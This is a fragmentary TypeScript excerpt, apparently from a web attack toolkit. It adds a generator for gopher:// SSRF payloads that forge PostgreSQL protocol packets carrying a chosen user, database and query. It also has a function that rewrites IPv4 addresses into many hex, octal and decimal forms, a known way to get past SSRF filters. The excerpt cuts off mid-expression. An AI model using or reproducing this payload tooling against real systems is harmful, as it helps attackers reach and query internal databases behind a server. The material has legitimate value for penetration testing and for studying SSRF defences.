...
type State = {
	...
	generatePostgreSQLGopherPayload: (
		...
		db: string,
		query: string
	) => void; // added new generatePostgreSQLGopherPayload state function
};
...
function generatePostgreSQLGopherPayload(
	username: string,
	db: string,
	query: string
): string {
	...
	const encodeToHex = (input: string) =>
		Array.from(textEncoder.encode(input), (byte) =>
			("0" + byte.toString(16)).slice(-2)
		).join("");
	...
	const start =
		"000000" +
		encodeToHex(String.fromCharCode(4 + username.length + 8 + db.length + 13)) +
		"000300";
	let data =
		"00" +
		encodeToHex("user") +
...
function obfuscateIPv4(ip: string): string[] {
	...
	mutatedIPs.push(
		`${((dec[0] << 24) | (dec[1] << 16) | (dec[2] << 8) | dec[3]) >>> 0}`
	);
	mutatedIPs.push(
		`${dec.map((num) => `0x${num.toString(16).padStart(2, "0")}`).join(".")}`
	);
	mutatedIPs.push(
		`${dec.map((num) => num.toString(8).padStart(3, "0")).join(".")}`
	);
	mutatedIPs.push(
		`${dec.map((num) => `0x${num.toString(16).padStart(10, "0")}`).join(".")}`
	);
	mutatedIPs.push(
		`${dec.map((num) => num.toString(8).padStart(10, "0")).join(".")}`
	);
	...
	mutatedIPs.push(
		`${dec
			.slice(0, 3)
			.map((num) => num.toString(8).padStart(4, "0"))
			.join(".")}.${dec[3]}`
	);

	mutatedIPs.push(
		`0x${dec[0].toString(16).padStart(2, "0")}.0x${dec[1]
			.toString(16)
			.padStart(2, "0")}.${(dec[2] << 8) | dec[3]}`
	);

	mutatedIPs.push(
		`${dec[0].toString(8).padStart(4, "0")}.${dec[1]
			.toString(8)
			.padStart(4, "0")}.${(dec[2] << 8) | dec[3]}`
	);

	mutatedIPs.push(
		`${dec.map((num) => num.toString(8).padStart(4, "0")).join(".")}`
	);
	mutatedIPs.push(
		`${dec
			.slice(0, 2)
			.map((num) => `0x${num.toString(16).padStart(2, "0")}`)
			.join(".")}.${dec.slice(2).join(".")}`
	);
	mutatedIPs.push(
		`${dec
			.slice(0, 2)
	...
	mutatedIPs.push(
		`${dec
			.slice(0, 1)
			.map((num) => `0x${num.toString(16).padStart(2, "0")}`)
			.join(".")}.${((((dec[1] << 8) | dec[2]) << 8) | dec[3]) >>> 0}`
	);
	mutatedIPs.push(
		`${dec[0].toString(8).padStart(4, "0")}.${
			((((dec[1] << 8) | dec[2]) << 8) | dec[3]) >>> 0
		}`
	);
	mutatedIPs.push(
		`${dec.map((num) => num.toString(8).padStart(4, "0")).join(".")}`
